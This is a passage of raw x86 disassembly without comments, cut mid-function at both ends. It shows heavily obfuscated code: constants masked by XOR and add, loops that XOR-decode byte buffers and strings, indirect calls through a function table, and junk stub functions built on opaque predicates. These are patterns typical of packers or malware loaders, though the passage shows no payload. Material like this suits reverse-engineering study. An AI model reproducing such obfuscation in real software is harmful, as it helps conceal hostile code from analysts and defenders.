  425cb0:	xor    eax,ebx
  425cb2:	add    eax,esi
  425cb4:	mov    DWORD PTR [ebp-0x8],eax
  425cb7:	mov    eax,DWORD PTR [ebp-0x48]
  425cba:	mov    ecx,DWORD PTR [ebp-0x8]
  425cbd:	xor    eax,ebx
  425cbf:	add    eax,esi
  425cc1:	imul   eax,ecx
  425cc4:	mov    DWORD PTR [ebp-0x8],eax
  425cc7:	mov    eax,DWORD PTR [ebp-0x38]
  425cca:	mov    ecx,DWORD PTR [ebp-0x8]
  425ccd:	xor    eax,ebx
  425ccf:	add    eax,esi
  425cd1:	cmp    ecx,eax
  425cd3:	je     0x425e47
  425cd9:	mov    eax,DWORD PTR [ebp-0x8]
  425cdc:	mov    DWORD PTR [ebp-0x14],eax
  425cdf:	mov    eax,DWORD PTR [ebp-0xc]
  425ce2:	add    eax,DWORD PTR [ebp-0xd4]
  425ce8:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  425cef:	mov    DWORD PTR [ebp-0x34],edi
  425cf2:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  425cfc:	mov    DWORD PTR [ebp-0x8],eax
  425cff:	mov    DWORD PTR [ebp-0x30],0xf89c85bc
  425d06:	mov    DWORD PTR [ebp-0x1c],edi
  425d09:	mov    eax,DWORD PTR [ebp-0x20]
  425d0c:	xor    eax,ebx
  425d0e:	add    eax,esi
  425d10:	jmp    0x425e06
  425d15:	mov    DWORD PTR [ebp-0xe0],0xf89c85b4
  425d1f:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  425d29:	mov    eax,DWORD PTR [ebp-0x1c]
  425d2c:	mov    ecx,DWORD PTR [ebp-0x44]
  425d2f:	xor    eax,ebx
  425d31:	add    eax,esi
  425d33:	imul   eax,ecx
  425d36:	mov    ecx,DWORD PTR [ebp-0x8]
  425d39:	mov    al,BYTE PTR [eax+ecx*1]
  425d3c:	mov    BYTE PTR [ebp-0x2],al
  425d3f:	mov    eax,DWORD PTR [ebp-0x1c]
  425d42:	mov    ecx,DWORD PTR [ebp-0x44]
  425d45:	xor    eax,ebx
  425d47:	add    eax,esi
  425d49:	imul   eax,ecx
  425d4c:	mov    ecx,DWORD PTR [ebp-0xe8]
  425d52:	xor    ecx,ebx
  425d54:	add    eax,ecx
  425d56:	mov    ecx,DWORD PTR [ebp-0x8]
  425d59:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ef]
  425d61:	mov    ecx,DWORD PTR [ebp-0xe0]
  425d67:	xor    ecx,ebx
  425d69:	lea    eax,[ecx+eax*1+0x3272ef]
  425d70:	movzx  ecx,BYTE PTR [ebp-0x2]
  425d74:	xor    ecx,eax
  425d76:	mov    BYTE PTR [ebp-0x2],cl
  425d79:	mov    al,BYTE PTR [ebp-0x2]
  425d7c:	mov    ecx,DWORD PTR [ebp-0x1c]
  425d7f:	mov    edx,DWORD PTR [ebp-0x44]
  425d82:	xor    ecx,ebx
  425d84:	add    ecx,esi
  425d86:	imul   ecx,edx
  425d89:	mov    edx,DWORD PTR [ebp-0x8]
  425d8c:	mov    BYTE PTR [ecx+edx*1],al
  425d8f:	mov    eax,DWORD PTR [ebp-0x1c]
  425d92:	mov    ecx,DWORD PTR [ebp-0x44]
  425d95:	xor    eax,ebx
  425d97:	add    eax,esi
  425d99:	imul   eax,ecx
  425d9c:	mov    ecx,DWORD PTR [ebp-0x8]
  425d9f:	mov    al,BYTE PTR [eax+ecx*1]
  425da2:	mov    BYTE PTR [ebp-0x2],al
  425da5:	mov    eax,DWORD PTR [ebp-0x1c]
  425da8:	mov    ecx,DWORD PTR [ebp-0x44]
  425dab:	xor    eax,ebx
  425dad:	add    eax,esi
  425daf:	imul   eax,ecx
  425db2:	mov    ecx,DWORD PTR [ebp-0x34]
  425db5:	xor    ecx,ebx
  425db7:	add    eax,ecx
  425db9:	mov    ecx,DWORD PTR [ebp-0x8]
  425dbc:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ef]
  425dc4:	mov    ecx,DWORD PTR [ebp-0xc4]
  425dca:	xor    ecx,ebx
  425dcc:	lea    eax,[ecx+eax*1+0x3272ef]
  425dd3:	movzx  ecx,BYTE PTR [ebp-0x2]
  425dd7:	xor    ecx,eax
  425dd9:	mov    BYTE PTR [ebp-0x2],cl
  425ddc:	mov    al,BYTE PTR [ebp-0x2]
  425ddf:	mov    ecx,DWORD PTR [ebp-0x1c]
  425de2:	mov    edx,DWORD PTR [ebp-0x44]
  425de5:	xor    ecx,ebx
  425de7:	add    ecx,esi
  425de9:	imul   ecx,edx
  425dec:	mov    edx,DWORD PTR [ebp-0x8]
  425def:	mov    BYTE PTR [ecx+edx*1],al
  425df2:	mov    eax,DWORD PTR [ebp-0x30]
  425df5:	mov    ecx,DWORD PTR [ebp-0x34]
  425df8:	xor    eax,ebx
  425dfa:	xor    ecx,ebx
  425dfc:	add    eax,esi
  425dfe:	add    ecx,esi
  425e00:	imul   eax,ecx
  425e03:	add    eax,DWORD PTR [ebp-0x44]
  425e06:	mov    DWORD PTR [ebp-0x44],eax
  425e09:	mov    eax,DWORD PTR [ebp-0x44]
  425e0c:	mov    ecx,DWORD PTR [ebp-0x14]
  425e0f:	cmp    ecx,eax
  425e11:	jb     0x425d15
  425e17:	mov    eax,DWORD PTR [ebp-0x34]
  425e1a:	mov    ecx,DWORD PTR [ebp-0x14]
  425e1d:	xor    eax,ebx
  425e1f:	add    eax,esi
  425e21:	imul   eax,ecx
  425e24:	mov    ecx,DWORD PTR [ebp-0x20]
  425e27:	xor    ecx,ebx
  425e29:	add    ecx,esi
  425e2b:	or     eax,ecx
  425e2d:	mov    ecx,DWORD PTR [ebp-0x2c]
  425e30:	xor    ecx,ebx
  425e32:	add    eax,ecx
  425e34:	mov    ecx,DWORD PTR [ebp-0x2c]
  425e37:	xor    ecx,ebx
  425e39:	add    eax,ecx
  425e3b:	mov    ecx,DWORD PTR [ebp-0xc]
  425e3e:	lea    eax,[eax+ecx*1+0x64e5de]
  425e45:	jmp    0x425e56
  425e47:	mov    eax,DWORD PTR [ebp-0x2c]
  425e4a:	mov    ecx,DWORD PTR [ebp-0xc]
  425e4d:	xor    eax,ebx
  425e4f:	lea    eax,[eax+ecx*1+0x3272ef]
  425e56:	mov    DWORD PTR [ebp-0xc],eax
  425e59:	mov    eax,DWORD PTR [ebp-0x2c]
  425e5c:	xor    eax,ebx
  425e5e:	mov    ecx,0xffcd8d11
  425e63:	sub    ecx,eax
  425e65:	add    ecx,DWORD PTR [ebp-0x28]
  425e68:	mov    eax,DWORD PTR [ebp-0x2c]
  425e6b:	mov    edx,DWORD PTR [ebp-0xc]
  425e6e:	xor    eax,ebx
  425e70:	add    eax,esi
  425e72:	imul   eax,edx
  425e75:	cmp    eax,ecx
  425e77:	jbe    0x425c89
  425e7d:	mov    eax,DWORD PTR [ebp-0x10]
  425e80:	mov    ecx,DWORD PTR [ebp-0x40]
  425e83:	mov    eax,DWORD PTR [ebp+0x8]
  425e86:	mov    edx,DWORD PTR [ebp-0x54]
  425e89:	mov    eax,DWORD PTR [eax+0x1e0]
  425e8f:	xor    edx,ebx
  425e91:	add    edx,esi
  425e93:	push   edx
  425e94:	mov    edx,DWORD PTR [ebp-0x3c]
  425e97:	xor    edx,ebx
  425e99:	add    edx,esi
  425e9b:	push   edx
  425e9c:	push   ecx
  425e9d:	mov    DWORD PTR [ebp-0x30],ecx
  425ea0:	mov    ecx,DWORD PTR [ebp-0x10]
  425ea3:	xor    ecx,ebx
  425ea5:	add    ecx,esi
  425ea7:	push   ecx
  425ea8:	call   DWORD PTR [eax+0x14]
  425eab:	mov    edi,eax
  425ead:	mov    eax,DWORD PTR [ebp-0x10]
  425eb0:	xor    eax,ebx
  425eb2:	add    eax,esi
  425eb4:	cmp    eax,edi
  425eb6:	je     0x425f11
  425eb8:	mov    eax,DWORD PTR [ebp-0x10]
  425ebb:	jmp    0x425ede
  425ebd:	mov    ecx,DWORD PTR [ebp-0x24]
  425ec0:	xor    eax,ebx
  425ec2:	mov    cl,BYTE PTR [ecx+eax*1+0x3272ef]
  425ec9:	mov    BYTE PTR [eax+edi*1+0x3272ef],cl
  425ed0:	mov    ecx,DWORD PTR [ebp-0x18]
  425ed3:	xor    ecx,ebx
  425ed5:	lea    eax,[ecx+eax*1+0x3272ef]
  425edc:	xor    eax,ebx
  425ede:	mov    ecx,DWORD PTR [ebp-0x40]
  425ee1:	sub    ecx,esi
  425ee3:	xor    ecx,ebx
  425ee5:	cmp    eax,ecx
  425ee7:	jne    0x425ebd
  425ee9:	mov    eax,DWORD PTR [ebp+0x8]
  425eec:	mov    ecx,DWORD PTR [ebp-0x50]
  425eef:	mov    eax,DWORD PTR [eax+0x1e0]
  425ef5:	xor    ecx,ebx
  425ef7:	add    ecx,esi
  425ef9:	push   ecx
  425efa:	mov    ecx,DWORD PTR [ebp-0x10]
  425efd:	xor    ecx,ebx
  425eff:	add    ecx,esi
  425f01:	push   ecx
  425f02:	push   DWORD PTR [ebp-0x24]
  425f05:	call   DWORD PTR [eax+0x18]
  425f08:	mov    eax,DWORD PTR [ebp-0x30]
  425f0b:	mov    DWORD PTR [ebp-0x24],edi
  425f0e:	mov    DWORD PTR [ebp-0x40],eax
  425f11:	mov    edi,DWORD PTR [ebp-0x24]
  425f14:	mov    eax,DWORD PTR [ebp-0x18]
  425f17:	mov    ecx,DWORD PTR [ebp-0x10]
  425f1a:	xor    eax,ebx
  425f1c:	mov    DWORD PTR [ebp-0x30],edi
  425f1f:	add    eax,esi
  425f21:	mov    DWORD PTR [ebp-0x5c],0x39222a22
  425f28:	mov    DWORD PTR [ebp-0x58],0x37223f22
  425f2f:	jmp    0x425f62
  425f31:	xor    ecx,ebx
  425f33:	mov    dl,BYTE PTR [ebp+ecx*1+0x327293]
  425f3a:	xor    dl,0x7b
  425f3d:	dec    dl
  425f3f:	mov    DWORD PTR [ebp-0x3c],ecx
  425f42:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272ef]
  425f4a:	movzx  edx,dl
  425f4d:	cmp    ecx,edx
  425f4f:	jne    0x425f6c
  425f51:	mov    ecx,DWORD PTR [ebp-0x18]
  425f54:	mov    edx,DWORD PTR [ebp-0x3c]
  425f57:	xor    ecx,ebx
  425f59:	lea    ecx,[ecx+edx*1+0x3272ef]
  425f60:	xor    ecx,ebx
  425f62:	cmp    ecx,0xf89c85b1
  425f68:	jne    0x425f31
  425f6a:	jmp    0x425f73
  425f6c:	mov    eax,DWORD PTR [ebp-0x10]
  425f6f:	xor    eax,ebx
  425f71:	add    eax,esi
  425f73:	mov    ecx,DWORD PTR [ebp-0x10]
  425f76:	xor    ecx,ebx
  425f78:	add    ecx,esi
  425f7a:	cmp    ecx,eax
  425f7c:	je     0x4260ef
  425f82:	mov    eax,DWORD PTR [edi+0x8]
  425f85:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  425f8c:	mov    DWORD PTR [ebp-0x3c],0xf89cc328
  425f93:	mov    DWORD PTR [ebp-0x48],0xf89cb5b9
  425f9a:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  425fa1:	mov    DWORD PTR [ebp-0x14],eax
  425fa4:	mov    eax,DWORD PTR [ebp+0x8]
  425fa7:	mov    ecx,DWORD PTR [ebp-0x20]
  425faa:	xor    ecx,ebx
  425fac:	add    ecx,esi
  425fae:	push   ecx
  425faf:	mov    ecx,DWORD PTR [ebp-0x48]
  425fb2:	mov    eax,DWORD PTR [eax+0x1e0]
  425fb8:	xor    ecx,ebx
  425fba:	add    ecx,esi
  425fbc:	push   ecx
  425fbd:	mov    ecx,DWORD PTR [ebp-0x3c]
  425fc0:	xor    ecx,ebx
  425fc2:	add    ecx,esi
  425fc4:	push   ecx
  425fc5:	mov    ecx,DWORD PTR [ebp-0xc]
  425fc8:	xor    ecx,ebx
  425fca:	add    ecx,esi
  425fcc:	push   ecx
  425fcd:	call   DWORD PTR [eax+0x14]
  425fd0:	mov    edi,eax
  425fd2:	mov    eax,DWORD PTR [ebp+0x8]
  425fd5:	mov    ecx,DWORD PTR [ebp-0x20]
  425fd8:	mov    eax,DWORD PTR [eax+0x1e0]
  425fde:	xor    ecx,ebx
  425fe0:	add    ecx,esi
  425fe2:	push   ecx
  425fe3:	mov    ecx,DWORD PTR [ebp-0x48]
  425fe6:	xor    ecx,ebx
  425fe8:	add    ecx,esi
  425fea:	push   ecx
  425feb:	mov    ecx,DWORD PTR [ebp-0xc]
  425fee:	push   DWORD PTR [ebp-0x14]
  425ff1:	xor    ecx,ebx
  425ff3:	add    ecx,esi
  425ff5:	push   ecx
  425ff6:	call   DWORD PTR [eax+0x14]
  425ff9:	mov    ecx,DWORD PTR [ebp-0xc]
  425ffc:	xor    ecx,ebx
  425ffe:	add    ecx,esi
  426000:	mov    DWORD PTR [ebp-0x20],eax
  426003:	cmp    ecx,edi
  426005:	je     0x426392
  42600b:	mov    ecx,DWORD PTR [ebp-0xc]
  42600e:	xor    ecx,ebx
  426010:	add    ecx,esi
  426012:	cmp    ecx,eax
  426014:	je     0x426392
  42601a:	mov    DWORD PTR [ebp-0x3c],0xf89c85bc
  426021:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  426028:	mov    ecx,DWORD PTR [ebp-0x3c]
  42602b:	xor    cl,0xa8
  42602e:	sub    cl,0x11
  426031:	mov    BYTE PTR [edi],cl
  426033:	mov    ecx,DWORD PTR [ebp-0xc]
  426036:	xor    cl,0xa8
  426039:	sub    cl,0x11
  42603c:	mov    BYTE PTR [edi+0x1],cl
  42603f:	mov    ecx,DWORD PTR [ebp-0x54]
  426042:	xor    cl,0xa8
  426045:	sub    cl,0x11
  426048:	mov    BYTE PTR [edi+0x2],cl
  42604b:	and    DWORD PTR [ebp-0xc8],0x0
  426052:	and    DWORD PTR [ebp-0xdc],0x0
  426059:	lea    ecx,[ebp-0xdc]
  42605f:	push   ecx
  426060:	push   DWORD PTR [ebp-0x14]
  426063:	push   eax
  426064:	lea    eax,[ebp-0xc8]
  42606a:	push   eax
  42606b:	mov    eax,DWORD PTR [ebp-0x30]
  42606e:	push   DWORD PTR [eax+0xc]
  426071:	mov    eax,DWORD PTR [ebp-0x24]
  426074:	add    eax,0x10
  426077:	push   eax
  426078:	push   edi
  426079:	call   0x425320
  42607e:	mov    DWORD PTR [ebp-0x3c],eax
  426081:	mov    eax,DWORD PTR [ebp+0x8]
  426084:	mov    ecx,DWORD PTR [ebp-0x50]
  426087:	mov    eax,DWORD PTR [eax+0x1e0]
  42608d:	xor    ecx,ebx
  42608f:	add    ecx,esi
  426091:	push   ecx
  426092:	mov    ecx,DWORD PTR [ebp-0xc]
  426095:	xor    ecx,ebx
  426097:	add    ecx,esi
  426099:	push   ecx
  42609a:	push   edi
  42609b:	call   DWORD PTR [eax+0x18]
  42609e:	mov    eax,DWORD PTR [ebp-0x3c]
  4260a1:	add    eax,0xffcd8d11
  4260a6:	xor    eax,ebx
  4260a8:	cmp    eax,0xf89c85b9
  4260ad:	mov    eax,DWORD PTR [ebp+0x8]
  4260b0:	mov    eax,DWORD PTR [eax+0x1e0]
  4260b6:	mov    ecx,DWORD PTR [ebp-0x50]
  4260b9:	jne    0x4260dc
  4260bb:	xor    ecx,ebx
  4260bd:	add    ecx,esi
  4260bf:	push   ecx
  4260c0:	mov    ecx,DWORD PTR [ebp-0xc]
  4260c3:	xor    ecx,ebx
  4260c5:	add    ecx,esi
  4260c7:	push   ecx
  4260c8:	push   DWORD PTR [ebp-0x24]
  4260cb:	call   DWORD PTR [eax+0x18]
  4260ce:	mov    eax,DWORD PTR [ebp-0x20]
  4260d1:	mov    DWORD PTR [ebp-0x24],eax
  4260d4:	mov    eax,DWORD PTR [ebp-0x14]
  4260d7:	mov    DWORD PTR [ebp-0x40],eax
  4260da:	jmp    0x4260ef
  4260dc:	xor    ecx,ebx
  4260de:	add    ecx,esi
  4260e0:	push   ecx
  4260e1:	mov    ecx,DWORD PTR [ebp-0xc]
  4260e4:	xor    ecx,ebx
  4260e6:	add    ecx,esi
  4260e8:	push   ecx
  4260e9:	push   DWORD PTR [ebp-0x20]
  4260ec:	call   DWORD PTR [eax+0x18]
  4260ef:	mov    eax,DWORD PTR [ebp-0x40]
  4260f2:	mov    DWORD PTR [ebp-0x38],eax
  4260f5:	mov    eax,DWORD PTR [ebp-0x24]
  4260f8:	mov    DWORD PTR [ebp-0x28],0xf89c85b9
  4260ff:	mov    DWORD PTR [ebp-0x3c],eax
  426102:	mov    edi,0xf89c85ba
  426107:	mov    DWORD PTR [ebp-0x2c],edi
  42610a:	mov    eax,DWORD PTR [ebp-0x28]
  42610d:	xor    eax,ebx
  42610f:	add    eax,esi
  426111:	mov    DWORD PTR [ebp-0xc],eax
  426114:	mov    eax,DWORD PTR [ebp-0x28]
  426117:	xor    eax,ebx
  426119:	add    eax,esi
  42611b:	mov    DWORD PTR [ebp-0x14],eax
  42611e:	mov    DWORD PTR [ebp-0x48],0xf89c8599
  426125:	mov    DWORD PTR [ebp-0x20],0xf89c85b0
  42612c:	mov    eax,DWORD PTR [ebp-0x28]
  42612f:	mov    ecx,DWORD PTR [ebp-0x38]
  426132:	xor    eax,ebx
  426134:	add    eax,esi
  426136:	cmp    ecx,eax
  426138:	je     0x42632e
  42613e:	jmp    0x42630a
  426143:	mov    ecx,DWORD PTR [ebp-0xc]
  426146:	mov    eax,DWORD PTR [ebp-0x38]
  426149:	sub    eax,ecx
  42614b:	mov    ecx,DWORD PTR [ebp-0x48]
  42614e:	xor    ecx,ebx
  426150:	add    ecx,esi
  426152:	xor    edx,edx
  426154:	div    ecx
  426156:	mov    DWORD PTR [ebp-0x14],eax
  426159:	mov    eax,DWORD PTR [ebp-0x20]
  42615c:	mov    ecx,DWORD PTR [ebp-0x14]
  42615f:	xor    eax,ebx
  426161:	add    eax,esi
  426163:	cmp    ecx,eax
  426165:	jbe    0x426171
  426167:	mov    eax,DWORD PTR [ebp-0x20]
  42616a:	xor    eax,ebx
  42616c:	add    eax,esi
  42616e:	mov    DWORD PTR [ebp-0x14],eax
  426171:	mov    eax,DWORD PTR [ebp-0x48]
  426174:	mov    ecx,DWORD PTR [ebp-0x14]
  426177:	xor    eax,ebx
  426179:	add    eax,esi
  42617b:	imul   eax,ecx
  42617e:	mov    DWORD PTR [ebp-0x14],eax
  426181:	mov    eax,DWORD PTR [ebp-0x28]
  426184:	mov    ecx,DWORD PTR [ebp-0x14]
  426187:	xor    eax,ebx
  426189:	add    eax,esi
  42618b:	cmp    ecx,eax
  42618d:	je     0x4262f8
  426193:	mov    eax,DWORD PTR [ebp-0x14]
  426196:	mov    DWORD PTR [ebp-0x34],eax
  426199:	mov    eax,DWORD PTR [ebp-0xc]
  42619c:	add    eax,DWORD PTR [ebp-0x3c]
  42619f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  4261a6:	mov    DWORD PTR [ebp-0x14],edi
  4261a9:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  4261b0:	mov    DWORD PTR [ebp-0x1c],eax
  4261b3:	mov    DWORD PTR [ebp-0x30],0xf89c85bc
  4261ba:	mov    DWORD PTR [ebp-0x8],edi
  4261bd:	mov    eax,DWORD PTR [ebp-0x4c]
  4261c0:	xor    eax,ebx
  4261c2:	add    eax,esi
  4261c4:	jmp    0x4262b7
  4261c9:	mov    DWORD PTR [ebp-0xe4],0xf89c85b4
  4261d3:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  4261dd:	mov    eax,DWORD PTR [ebp-0x8]
  4261e0:	mov    ecx,DWORD PTR [ebp-0x18]
  4261e3:	xor    eax,ebx
  4261e5:	add    eax,esi
  4261e7:	imul   eax,ecx
  4261ea:	mov    ecx,DWORD PTR [ebp-0x1c]
  4261ed:	mov    al,BYTE PTR [eax+ecx*1]
  4261f0:	mov    BYTE PTR [ebp-0x1],al
  4261f3:	mov    eax,DWORD PTR [ebp-0x8]
  4261f6:	mov    ecx,DWORD PTR [ebp-0x18]
  4261f9:	xor    eax,ebx
  4261fb:	add    eax,esi
  4261fd:	imul   eax,ecx
  426200:	mov    ecx,DWORD PTR [ebp-0x54]
  426203:	xor    ecx,ebx
  426205:	add    eax,ecx
  426207:	mov    ecx,DWORD PTR [ebp-0x1c]
  42620a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ef]
  426212:	mov    ecx,DWORD PTR [ebp-0xe4]
  426218:	xor    ecx,ebx
  42621a:	lea    eax,[ecx+eax*1+0x3272ef]
  426221:	movzx  ecx,BYTE PTR [ebp-0x1]
  426225:	xor    ecx,eax
  426227:	mov    BYTE PTR [ebp-0x1],cl
  42622a:	mov    al,BYTE PTR [ebp-0x1]
  42622d:	mov    ecx,DWORD PTR [ebp-0x8]
  426230:	mov    edx,DWORD PTR [ebp-0x18]
  426233:	xor    ecx,ebx
  426235:	add    ecx,esi
  426237:	imul   ecx,edx
  42623a:	mov    edx,DWORD PTR [ebp-0x1c]
  42623d:	mov    BYTE PTR [ecx+edx*1],al
  426240:	mov    eax,DWORD PTR [ebp-0x8]
  426243:	mov    ecx,DWORD PTR [ebp-0x18]
  426246:	xor    eax,ebx
  426248:	add    eax,esi
  42624a:	imul   eax,ecx
  42624d:	mov    ecx,DWORD PTR [ebp-0x1c]
  426250:	mov    al,BYTE PTR [eax+ecx*1]
  426253:	mov    BYTE PTR [ebp-0x1],al
  426256:	mov    eax,DWORD PTR [ebp-0x8]
  426259:	mov    ecx,DWORD PTR [ebp-0x18]
  42625c:	xor    eax,ebx
  42625e:	add    eax,esi
  426260:	imul   eax,ecx
  426263:	mov    ecx,DWORD PTR [ebp-0x14]
  426266:	xor    ecx,ebx
  426268:	add    eax,ecx
  42626a:	mov    ecx,DWORD PTR [ebp-0x1c]
  42626d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ef]
  426275:	mov    ecx,DWORD PTR [ebp-0xd0]
  42627b:	xor    ecx,ebx
  42627d:	lea    eax,[ecx+eax*1+0x3272ef]
  426284:	movzx  ecx,BYTE PTR [ebp-0x1]
  426288:	xor    ecx,eax
  42628a:	mov    BYTE PTR [ebp-0x1],cl
  42628d:	mov    al,BYTE PTR [ebp-0x1]
  426290:	mov    ecx,DWORD PTR [ebp-0x8]
  426293:	mov    edx,DWORD PTR [ebp-0x18]
  426296:	xor    ecx,ebx
  426298:	add    ecx,esi
  42629a:	imul   ecx,edx
  42629d:	mov    edx,DWORD PTR [ebp-0x1c]
  4262a0:	mov    BYTE PTR [ecx+edx*1],al
  4262a3:	mov    eax,DWORD PTR [ebp-0x30]
  4262a6:	mov    ecx,DWORD PTR [ebp-0x14]
  4262a9:	xor    eax,ebx
  4262ab:	xor    ecx,ebx
  4262ad:	add    eax,esi
  4262af:	add    ecx,esi
  4262b1:	imul   eax,ecx
  4262b4:	add    eax,DWORD PTR [ebp-0x18]
  4262b7:	mov    DWORD PTR [ebp-0x18],eax
  4262ba:	mov    eax,DWORD PTR [ebp-0x18]
  4262bd:	mov    ecx,DWORD PTR [ebp-0x34]
  4262c0:	cmp    ecx,eax
  4262c2:	jb     0x4261c9
  4262c8:	mov    eax,DWORD PTR [ebp-0x14]
  4262cb:	mov    ecx,DWORD PTR [ebp-0x34]
  4262ce:	xor    eax,ebx
  4262d0:	add    eax,esi
  4262d2:	imul   eax,ecx
  4262d5:	mov    ecx,DWORD PTR [ebp-0x4c]
  4262d8:	xor    ecx,ebx
  4262da:	add    ecx,esi
  4262dc:	or     eax,ecx
  4262de:	mov    ecx,DWORD PTR [ebp-0x2c]
  4262e1:	xor    ecx,ebx
  4262e3:	add    eax,ecx
  4262e5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4262e8:	xor    ecx,ebx
  4262ea:	add    eax,ecx
  4262ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4262ef:	lea    eax,[eax+ecx*1+0x64e5de]
  4262f6:	jmp    0x426307
  4262f8:	mov    eax,DWORD PTR [ebp-0x2c]
  4262fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4262fe:	xor    eax,ebx
  426300:	lea    eax,[eax+ecx*1+0x3272ef]
  426307:	mov    DWORD PTR [ebp-0xc],eax
  42630a:	mov    eax,DWORD PTR [ebp-0x2c]
  42630d:	xor    eax,ebx
  42630f:	mov    ecx,0xffcd8d11
  426314:	sub    ecx,eax
  426316:	add    ecx,DWORD PTR [ebp-0x38]
  426319:	mov    eax,DWORD PTR [ebp-0x2c]
  42631c:	mov    edx,DWORD PTR [ebp-0xc]
  42631f:	xor    eax,ebx
  426321:	add    eax,esi
  426323:	imul   eax,edx
  426326:	cmp    eax,ecx
  426328:	jbe    0x426143
  42632e:	push   DWORD PTR [ebp+0x8]
  426331:	mov    eax,DWORD PTR [ebp+0x8]
  426334:	push   DWORD PTR [eax+0x1cc]
  42633a:	lea    eax,[ebp-0xd8]
  426340:	push   eax
  426341:	mov    eax,DWORD PTR [ebp+0x8]
  426344:	mov    eax,DWORD PTR [eax+0x1c4]
  42634a:	push   DWORD PTR [eax]
  42634c:	mov    eax,DWORD PTR [ebp+0x8]
  42634f:	mov    eax,DWORD PTR [eax+0x1c0]
  426355:	push   DWORD PTR [eax]
  426357:	push   DWORD PTR [ebp-0x40]
  42635a:	push   DWORD PTR [ebp-0x24]
  42635d:	call   0x426df4
  426362:	mov    DWORD PTR [ebp-0x3c],eax
  426365:	mov    eax,DWORD PTR [ebp-0x10]
  426368:	mov    ecx,DWORD PTR [ebp-0x24]
  42636b:	xor    eax,ebx
  42636d:	add    eax,esi
  42636f:	cmp    eax,ecx
  426371:	je     0x426392
  426373:	mov    eax,DWORD PTR [ebp+0x8]
  426376:	mov    ecx,DWORD PTR [ebp-0x50]
  426379:	mov    eax,DWORD PTR [eax+0x1e0]
  42637f:	xor    ecx,ebx
  426381:	add    ecx,esi
  426383:	push   ecx
  426384:	mov    ecx,DWORD PTR [ebp-0x10]
  426387:	xor    ecx,ebx
  426389:	add    ecx,esi
  42638b:	push   ecx
  42638c:	push   DWORD PTR [ebp-0x24]
  42638f:	call   DWORD PTR [eax+0x18]
  426392:	pop    edi
  426393:	pop    esi
  426394:	pop    ebx
  426395:	leave  
  426396:	ret    0x4
  426399:	push   ebp
  42639a:	mov    ebp,esp
  42639c:	push   ecx
  42639d:	push   ecx
  42639e:	lea    eax,[ebp-0x8]
  4263a1:	mov    DWORD PTR [ebp-0x4],eax
  4263a4:	push   esi
  4263a5:	mov    esi,DWORD PTR [ebp-0x4]
  4263a8:	mov    eax,0xf881ba2f
  4263ad:	mov    DWORD PTR [esi],eax
  4263af:	mov    esi,DWORD PTR [ebp-0x8]
  4263b2:	cmp    esi,eax
  4263b4:	pop    esi
  4263b5:	jne    0x4263bf
  4263b7:	mov    BYTE PTR [ecx+0xa],0x7a
  4263bb:	mov    BYTE PTR [edx+0x8],0x2f
  4263bf:	mov    BYTE PTR [edx+0xa],0x7a
  4263c3:	mov    BYTE PTR [ecx+0x2],0x14
  4263c7:	leave  
  4263c8:	ret    
  4263c9:	push   ebp
  4263ca:	mov    ebp,esp
  4263cc:	push   ecx
  4263cd:	push   ecx
  4263ce:	lea    eax,[ebp-0x8]
  4263d1:	mov    DWORD PTR [ebp-0x4],eax
  4263d4:	mov    edx,DWORD PTR [ebp-0x4]
  4263d7:	mov    eax,0xf88b0bc3
  4263dc:	mov    DWORD PTR [edx],eax
  4263de:	mov    edx,DWORD PTR [ebp-0x8]
  4263e1:	cmp    edx,eax
  4263e3:	jne    0x4263f4
  4263e5:	mov    eax,DWORD PTR [ebp+0x8]
  4263e8:	mov    BYTE PTR [ecx+0x9],0xe
  4263ec:	mov    BYTE PTR [eax+0x7],0x57
  4263f0:	mov    BYTE PTR [ecx+0x6],0xf
  4263f4:	mov    BYTE PTR [ecx+0x3],0x1e
  4263f8:	leave  
  4263f9:	ret    0x4
  4263fc:	push   ebp
  4263fd:	mov    ebp,esp
  4263ff:	push   ecx
  426400:	push   ecx
  426401:	lea    eax,[ebp-0x8]
  426404:	mov    DWORD PTR [ebp-0x4],eax
  426407:	mov    edx,DWORD PTR [ebp-0x4]
  42640a:	mov    eax,0x7e0da2f
  42640f:	mov    DWORD PTR [edx],eax
  426411:	mov    edx,DWORD PTR [ebp-0x8]
  426414:	cmp    edx,eax
  426416:	jne    0x42641c
  426418:	mov    BYTE PTR [ecx+0x7],0x57
  42641c:	mov    eax,DWORD PTR [ebp+0x8]
  42641f:	mov    BYTE PTR [ecx+0x1],0x11
  426423:	mov    BYTE PTR [eax+0x9],0x2e
  426427:	leave  
  426428:	ret    0x4
  42642b:	push   ebp
  42642c:	mov    ebp,esp
  42642e:	push   ecx
  42642f:	push   ecx
  426430:	lea    eax,[ebp-0x8]
  426433:	mov    DWORD PTR [ebp-0x4],eax
  426436:	push   esi
  426437:	mov    esi,DWORD PTR [ebp-0x4]
  42643a:	mov    eax,0x7060e30
  42643f:	mov    DWORD PTR [esi],eax
  426441:	mov    esi,DWORD PTR [ebp-0x8]
  426444:	cmp    esi,eax
  426446:	pop    esi
  426447:	jne    0x426453
  426449:	mov    BYTE PTR [edx+0x4],0xb
  42644d:	mov    WORD PTR [ecx+0x3],0xb1e
  426453:	mov    BYTE PTR [edx],0x3f
  426456:	leave  
  426457:	ret    
  426458:	push   ebp
  426459:	mov    ebp,esp
  42645b:	push   ecx
  42645c:	push   ecx
  42645d:	lea    eax,[ebp-0x8]
  426460:	mov    DWORD PTR [ebp-0x4],eax
  426463:	mov    edx,DWORD PTR [ebp-0x4]
  426466:	mov    eax,0xf8870b3f
  42646b:	mov    DWORD PTR [edx],eax
  42646d:	mov    edx,DWORD PTR [ebp-0x8]
  426470:	cmp    edx,eax
  426472:	jne    0x42647f
  426474:	mov    eax,DWORD PTR [ebp+0x8]
